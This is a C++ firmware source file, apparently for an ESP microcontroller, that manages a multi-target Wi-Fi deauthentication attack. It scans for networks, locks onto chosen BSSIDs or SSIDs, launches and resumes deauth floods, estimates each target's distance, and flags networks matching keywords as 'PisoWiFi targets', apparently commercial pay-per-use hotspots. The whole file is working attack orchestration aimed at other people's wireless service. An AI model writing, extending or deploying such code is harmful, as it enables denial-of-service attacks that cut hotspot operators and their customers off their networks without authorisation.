#include "attack_manager.h"
#include "deauth.h"
#include "definitions.h"
#include "config.h"

void AttackManager::begin() {
    Serial.println("⚔️  Attack Manager initialized");
}

void AttackManager::startAttack(const std::vector<AttackTarget>& targets, uint16_t reason) {
    Serial.println("\n⚔️ ==========================================");
    Serial.println("⚔️     STARTING MULTI-TARGET DEAUTH");
    Serial.printf("   Reason: %d | Targets: %d\n", reason, targets.size());
    Serial.println("⚔️ ==========================================");
    
    stop_deauth();
    
    for (const auto& t : targets) {
        Serial.printf("   🎯 %s | Ch:%d\n", t.ssid.c_str(), t.channel);
    }
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(50);
    
    int numNetworks = WiFi.scanNetworks(false, true, false, 300);
    
    std::vector<int> targetIndices;
    for (const auto& t : targets) {
        bool found = false;
        for (int i = 0; i < numNetworks; i++) {
            if (memcmp(WiFi.BSSID(i), t.bssid, 6) == 0) {
                targetIndices.push_back(i);
                found = true;
                break;
            }
        }
        if (!found) {
            for (int i = 0; i < numNetworks; i++) {
                if (WiFi.SSID(i) == t.ssid) {
                    targetIndices.push_back(i);
                    break;
                }
            }
        }
    }
    
    if (targetIndices.size() > 0) {
        start_multi_deauth(targetIndices, reason);
        Serial.printf("⚔️  Attacking %d targets!\n\n", targetIndices.size());
    } else {
        Serial.println("❌ No targets found!\n");
    }
}

void AttackManager::resumeAttack(const std::vector<AttackTarget>& savedTargets,
                                 uint16_t reason, bool& attackModeActive) {
    if (!attackModeActive) return;
    
    Serial.println("▶️  Resuming attack...");
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(50);
    
    int numNetworks = WiFi.scanNetworks(false, true, false, 300);
    
    std::vector<int> targetIndices;
    for (const auto& t : savedTargets) {
        for (int i = 0; i < numNetworks; i++) {
            if (memcmp(WiFi.BSSID(i), t.bssid, 6) == 0) {
                targetIndices.push_back(i);
                break;
            }
        }
    }
    
    if (targetIndices.size() > 0) {
        start_multi_deauth(targetIndices, reason);
        Serial.printf("⚔️  Resumed on %d targets!\n", targetIndices.size());
    } else {
        Serial.println("❌ Could not find targets to resume!");
        attackModeActive = false;
    }
}

void AttackManager::runAttackLoop(bool attackModeActive, bool attackPaused) {
    if (!attackModeActive || attackPaused) return;
    if (deauth_type == DEAUTH_TYPE_MULTI) {
        update_multi_attack();
        delay(10);
    }
}

void AttackManager::scanAndReport(std::vector<ScannedNetwork>& results) {
    Serial.println("🔍 Scanning WiFi networks...");
    int numNetworks = WiFi.scanNetworks(false, true, false, 500);
    results.clear();
    
    Serial.printf("📊 Found %d networks\n", numNetworks);
    
    int targetCount = 0;
    for (int i = 0; i < numNetworks; i++) {
        ScannedNetwork net;
        net.ssid = WiFi.SSID(i);
        net.bssid = WiFi.BSSIDstr(i);
        net.channel = WiFi.channel(i);
        net.rssi = WiFi.RSSI(i);
        net.distance = calculateDistance(net.rssi);
        net.is_target = matchesKeywords(net.ssid);
        
        if (net.is_target) targetCount++;
        results.push_back(net);
    }
    
    Serial.printf("🎯 PisoWiFi targets: %d\n\n", targetCount);
}

float AttackManager::calculateDistance(int rssi) {
    int txPower = -40;
    float n = 2.5;
    if (rssi >= txPower) return 0.5;
    if (rssi <= -90) return 50.0;
    float ratio = (txPower - rssi) / (10.0 * n);
    return constrain(pow(10, ratio), 0.5, 50.0);
}

bool AttackManager::matchesKeywords(const String& ssid) {
    String lower = ssid;
    lower.toLowerCase();
    for (int i = 0; i < SCAN_KEYWORD_COUNT; i++) {
        if (lower.indexOf(SCAN_KEYWORDS[i]) >= 0) return true;
    }
    return false;
}